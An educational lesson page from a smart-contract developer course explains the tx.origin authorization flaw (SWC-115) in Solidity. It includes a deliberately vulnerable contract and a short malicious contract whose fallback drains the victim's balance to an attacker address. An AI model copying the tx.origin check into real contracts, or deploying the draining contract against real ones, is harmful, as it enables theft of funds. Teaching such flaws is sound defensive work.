<!DOCTYPE html>
<html>
  <head>
    <title>Index - ConsenSys Academy Developer Bootcamp</title>
    <link href="../../../style.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.6.0/gsap.min.js" async></script>
    <script src="../../../text-bounce.js" async></script>
  </head>
  <body>
    <h2 id="txorigin-attack-swc-115">TxOrigin Attack (SWC-115)</h2>
<p>In this lesson we are going to cover a <code>tx.origin</code> attack. The global variable <code>tx.origin</code> in Solidity always references the address of the original sender of the transaction, of the full call chain. <a href="https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties" target="_blank">See the reference in the docs here.</a> This is different than <code>msg.sender</code> in that <code>msg.sender</code> references the address of the sender of the current call.</p>
<p>You should never use <code>tx.origin</code> in Solidity for authorization (<a href="https://swcregistry.io/docs/SWC-115" target="_blank">SWC-115</a>). The following smart contract shows you why. It is susceptible to attack.</p>
<div class="codehilite"><pre><span></span><code><span class="nv">pragma</span><span class="w"> </span><span class="nv">solidity</span><span class="w"> </span><span class="o">&gt;</span><span class="mi">0</span>.<span class="mi">5</span>.<span class="mi">0</span><span class="c1">;  </span><span class="w"></span>

<span class="o">//</span><span class="w"> </span><span class="nv">Example</span><span class="w"> </span><span class="nv">Tx</span>.<span class="nv">Origin</span><span class="w"> </span><span class="nv">Authentication</span><span class="w"> </span><span class="nv">Attack</span><span class="w">     </span>
<span class="nv">contract</span><span class="w"> </span><span class="nv">VulnerableContract</span><span class="w"> </span>{<span class="w">      </span>
<span class="w">  </span><span class="nv">address</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span><span class="nv">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">msg</span>.<span class="nv">sender</span><span class="c1">;             </span><span class="w"></span>

<span class="w">  </span><span class="nv">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="ss">(</span><span class="nv">address</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span><span class="nv">_recipient</span><span class="ss">)</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span>{<span class="w">          </span>
<span class="w">    </span><span class="nv">require</span><span class="ss">(</span><span class="nv">tx</span>.<span class="nv">origin</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nv">owner</span><span class="ss">)</span><span class="c1">;          </span><span class="w"></span>
<span class="w">    </span><span class="nv">_recipient</span>.<span class="nv">transfer</span><span class="ss">(</span><span class="nv">address</span><span class="ss">(</span><span class="nv">this</span><span class="ss">)</span>.<span class="nv">balance</span><span class="ss">)</span><span class="c1">;      </span><span class="w"></span>
<span class="w">  </span>}<span class="w">             </span>

<span class="w">  </span><span class="nv">function</span><span class="w"> </span><span class="nv">getBalance</span><span class="ss">()</span><span class="w"> </span><span class="nv">view</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span><span class="nv">returns</span><span class="ss">(</span><span class="nv">uint</span><span class="ss">)</span><span class="w"> </span>{<span class="w">          </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nv">address</span><span class="ss">(</span><span class="nv">this</span><span class="ss">)</span>.<span class="nv">balance</span><span class="c1">;      </span><span class="w"></span>
<span class="w">  </span>}<span class="w">             </span>

<span class="w">  </span><span class="nv">function</span><span class="ss">()</span><span class="w"> </span><span class="nv">external</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span>{}<span class="w">  </span>
}<span class="w">     </span>

<span class="nv">contract</span><span class="w"> </span><span class="nv">MaliciousContract</span><span class="w"> </span>{<span class="w">      </span>
<span class="w">  </span><span class="nv">VulnerableContract</span><span class="w"> </span><span class="nv">vulnerableContract</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">VulnerableContract</span><span class="ss">(</span><span class="mi">0</span><span class="nv">x08970FEd061E7747CD9a38d680A601510CB659FB</span><span class="ss">)</span><span class="c1">;      </span><span class="w"></span>
<span class="w">  </span><span class="nv">address</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span><span class="nv">attackerAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="nv">xdD870fA1b7C4700F2BD7f44238821C26f7392148</span><span class="c1">;             </span><span class="w"></span>

<span class="w">  </span><span class="nv">function</span><span class="ss">()</span><span class="w"> </span><span class="nv">external</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span>{<span class="w">          </span>
<span class="w">    </span><span class="nv">vulnerableContract</span>.<span class="nv">withdraw</span><span class="ss">(</span><span class="nv">attackerAddress</span><span class="ss">)</span><span class="c1">;      </span><span class="w"></span>
<span class="w">  </span>}<span class="w">  </span>
}<span class="w"></span>
</code></pre></div>

<p>In this contract, if the creator of the VulnerableContract is tricked into calling the MaliciousContract, the Malicious contract will be able to drain the VulnerableContract of all funds.</p>
<p>Additional Resources:</p>
<ul>
<li><a href="https://solidity.readthedocs.io/en/latest/security-considerations.html?#tx-origin" target="_blank">Solidity documentation on the security considerations of tx.origin</a></li>
<li><a href="https://swcregistry.io/docs/SWC-115" target="_blank">The SWC Registry entry for Authorization through tx.origin</a></li>
</ul>
    <br /><div class="footer">
    <a href="https://github.com/ConsenSys-Academy/Blockchain-Developer-Bootcamp/edit/staging/docs/S03-smart-contracts/M6-security/L2b-tx-origin-attack/index.md" target="_blank">Edit this page on GitHub</a>
    
    <div class="discord">
        <img class="discord-logo" src="../../../discord.svg" alt="Discord logo" ><a href="https://discord.gg/FrHSjSn9dX" target="_blank" >Questions? Ask on Discord! </a>  
    </div> 
</div>
  </body>
</html>